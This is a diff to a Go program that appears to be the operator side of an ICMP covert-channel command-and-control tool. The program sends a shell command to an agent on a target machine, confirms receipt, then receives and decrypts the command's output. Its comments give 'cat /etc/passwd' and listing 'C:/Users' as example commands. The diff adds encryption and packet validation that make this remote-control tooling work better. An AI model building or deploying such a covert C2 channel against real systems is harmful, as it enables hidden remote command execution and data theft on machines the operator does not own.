@@ -1,6 +1,7 @@
 package main
 
 import (
+	"errors"
 	"net"
 	"os"
 	"strconv"
@@ -13,13 +14,13 @@ import (
 )
 
 var (
-	target  string // ex - 192.168.149.129
-	command string // ex - Linux: cat /etc/passwd; Windows: Get-ChildItem C:/Users
+	target  string // example - 192.168.149.129
+	command string // example - Linux: cat /etc/passwd; Windows: Get-ChildItem C:/Users
 )
 
 func main() {
 	if len(os.Args) != 3 {
-		logger.Log(logger.Error, os.Args[0], "usage:", os.Args[0], "<target> <command>")
+		logger.Log(logger.Error, "usage:", os.Args[0], "<target> <command>")
 		os.Exit(logger.ERR_USAGE)
 	}
 
@@ -27,6 +28,7 @@ func main() {
 	command = os.Args[2] // command string to execute in target's shell (Linux: Bash, Windows: PowerShell)
 
 	// Resolve any DNS (if used) to get the real IP of the target
+	// Also checks that the provided IP is valid
 	targetIP, err := net.ResolveIPAddr("ip4", target)
 	if err != nil {
 		logger.LogError(err)
@@ -41,7 +43,7 @@ func main() {
 		os.Exit(logger.ERR_CONNECTION)
 	}
 
-	logger.Log(logger.Info, "Sending command to", targetIP.String(), "and listening for reply")
+	logger.Log(logger.Info, "Sending command to", targetIP.String())
 
 	// Send command to target
 	startTime, err := utils.SendICMPData(conn, targetIP, []byte(command))
@@ -50,36 +52,60 @@ func main() {
 		os.Exit(logger.ERR_CONNECTION)
 	}
 
-	// Wait for reply - ensure we're not receiving an Echo, but our custom reply
-	err = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	// Receive Echo Reply from Agent to confirm receipt of command
+	err = utils.ICMPDataReceived(conn, targetIP.IP, []byte(command))
 	if err != nil {
 		logger.LogError(err)
 		os.Exit(logger.ERR_GENERIC)
 	}
+	logger.Log(logger.Done, "Agent confirmed receipt of command")
+
+	// Wait for data to be returned from command
 	for {
-		rawReply, icmpType, srcAddr, magic, err := utils.ParseICMPConnection(conn)
+		err = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 		if err != nil {
 			logger.LogError(err)
-			break
+			os.Exit(logger.ERR_CONNECTION)
 		}
-		if srcAddr.String() != targetIP.String() {
-			logger.Log(logger.Error, "Source address does not match target address: sent to", targetIP.String()+", received from", srcAddr.String(), "=>", string(rawReply))
+
+		rawReply, icmpType, srcAddr, err := utils.GetICMPData(conn)
+		if err != nil {
+			logger.Log(logger.Error, "Could not get data from agent")
+			logger.LogError(err)
+
+			var WrongReplyIPError *utils.WrongReplyIPError
+			if errors.As(err, &WrongReplyIPError) || errors.Is(err, utils.ErrNoMagic) {
+				continue
+			}
+
+			os.Exit(logger.ERR_CONNECTION)
+		}
+
+		// Don't process unexpected ICMP Echo Replies
+		// To fix a Windows issue, don't capture replies that originate from your own system.
+		if icmpType == ipv4.ICMPTypeEchoReply { //&& srcAddr.String() != listenAddress.String() {
+			logger.Log(logger.Debug, "Caught unexpected Echo Reply from", srcAddr.String())
 			continue
 		}
-		if !magic {
-			logger.Log(logger.Error, "Reply from", srcAddr.String(), "does not contain magic =>", string(rawReply))
+
+		err = utils.ValidateICMPPacket(srcAddr, targetIP.IP)
+		if err != nil {
+			logger.LogError(err)
 			continue
 		}
+
+		decryptedReply, err := utils.DecryptContent(rawReply)
+		if err != nil {
+			logger.LogError(err)
+			continue
+		}
+		decryptedReplyString := string(decryptedReply)
 
 		duration := time.Since(startTime)
+		logger.Log(logger.Done, "Output from", srcAddr.String(), "("+strconv.Itoa(len(rawReply)), "bytes in", duration.String()+"):"+"\n"+decryptedReplyString)
 
-		switch icmpType {
-		case ipv4.ICMPTypeEchoReply:
-			logger.Log(logger.List, "Caught Echo Reply from", srcAddr.String(), "in", duration.String())
-			continue
-		default:
-			logger.Log(logger.Done, "Output from", srcAddr.String(), "("+strconv.Itoa(len(rawReply)), "bytes in", duration.String()+"):"+"\n"+string(rawReply))
-			return
-		}
+		break
 	}
+
+	_ = conn.Close()
 }
